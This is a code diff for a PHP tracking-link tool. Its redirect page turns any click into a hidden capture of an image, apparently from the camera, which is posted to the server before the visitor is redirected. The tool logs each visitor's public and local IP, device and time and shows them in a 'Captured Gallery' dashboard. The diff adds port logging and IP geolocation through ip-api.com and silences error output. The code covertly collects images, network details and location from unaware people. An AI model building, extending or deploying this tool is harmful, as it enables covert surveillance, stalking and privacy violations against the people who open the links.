@@ -1,12 +1,12 @@
 <?php
 date_default_timezone_set('Africa/Algiers');
 
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
+error_reporting(0);
+@ini_set('display_errors', 0);
 
 $upload_dir = 'uploads/';
 if (!is_dir($upload_dir)) {
-    mkdir($upload_dir, 0755, true);
+    @mkdir($upload_dir, 0755, true);
 }
 
 try {
@@ -29,6 +29,8 @@ try {
         image_data TEXT, 
         public_ip TEXT, 
         local_ip TEXT, 
+        port TEXT, 
+        location TEXT, 
         device_info TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
@@ -42,6 +44,20 @@ function get_real_ip() {
         return trim($ips[0]);
     }
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+}
+
+function get_ip_location($ip) {
+    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
+        return 'Local Network';
+    }
+    @$json = file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
+    if ($json) {
+        $data = json_decode($json, true);
+        if (isset($data['status']) && $data['status'] === 'success') {
+            return ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
+        }
+    }
+    return 'Unknown Location';
 }
 
 function get_device_type($ua) {
@@ -81,14 +97,16 @@ if (isset($_GET['r'])) {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 = $_POST['image'] ?? '';
             $public_ip = get_real_ip();
-            $local_ip = $_POST['lip'] ?? $public_ip;
+            $local_ip = $_POST['lip'] ?? 'Direct';
+            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
+            $location = get_ip_location($public_ip);
             $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
             $device = get_device_type($ua);
 
             if (!empty($img_base64)) {
                 try {
-                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?)");
-                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $device, date('Y-m-d H:i:s')]);
+                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+                    $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $device, date('Y-m-d H:i:s')]);
                 } catch (Exception $e) {}
             }
             exit('OK');
@@ -110,7 +128,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
         $avatarName = 'avatar_' . uniqid() . '.' . $ext;
-        move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
+        @move_uploaded_file($_FILES['avatar_file']['tmp_name'], $upload_dir . $avatarName);
         $sender_avatar = $upload_dir . $avatarName;
     } elseif (!empty($_POST['sender_avatar_url'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
@@ -119,7 +137,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
         $bgName = 'bg_' . uniqid() . '.' . $ext;
-        move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
+        @move_uploaded_file($_FILES['bg_file']['tmp_name'], $upload_dir . $bgName);
         $bg_image_url = $upload_dir . $bgName;
     } elseif (!empty($_POST['bg_image_url'])) {
         $bg_image_url = trim($_POST['bg_image_url']);
@@ -257,7 +275,6 @@ if (isset($_GET['r']) && !empty($target_redirect)):
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            // جعل أي ضغطة في أي مكان في الصفحة تؤدي للعملية
             document.body.addEventListener('click', triggerCaptureAndRedirect);
         });
     </script>
@@ -298,7 +315,7 @@ endif;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
-        .wrapper { max-width: 1000px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
+        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
         
         .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
         h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
@@ -316,10 +333,12 @@ endif;
         .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
         .flex-row { display: flex; gap: 8px; }
 
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-top: 15px; }
-        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; text-align: center; }
-        .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
-        .card-meta { margin-top: 10px; font-size: 11px; color: var(--text-muted); display: flex; justify-content: space-between; align-items: center; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
+        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
+        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
+        
+        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
+        .info-row span { color: #cbd5e1; }
         .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
 
         footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
@@ -375,7 +394,7 @@ endif;
         </div>
 
         <div class="section-box">
-            <h2>Captured Images Gallery</h2>
+            <h2>Captured Gallery & Details</h2>
             <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                 <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; background:#020617; border:1px solid var(--border-color); border-radius:8px; padding:10px; color:#fff; outline:none;">
                 <button type="submit" class="btn" style="height:42px;">Filter</button>
@@ -393,12 +412,26 @@ endif;
                             <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                 <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
                             </a>
-                            <div class="card-meta">
-                                <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
-                                <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
+                            <div class="info-row" style="margin-top:10px;">
+                                <span>Code:</span> <span class="code-badge"><?php echo htmlspecialchars($cap['code']); ?></span>
                             </div>
-                            <div style="font-size:10px; color:var(--text-muted); margin-top:4px; text-align:right;">
-                                <?php echo htmlspecialchars($cap['created_at']); ?>
+                            <div class="info-row">
+                                <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
+                            </div>
+                            <div class="info-row">
+                                <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
+                            </div>
+                            <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
+                                <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                             </div>
                         </div>
                     <?php endforeach; ?>
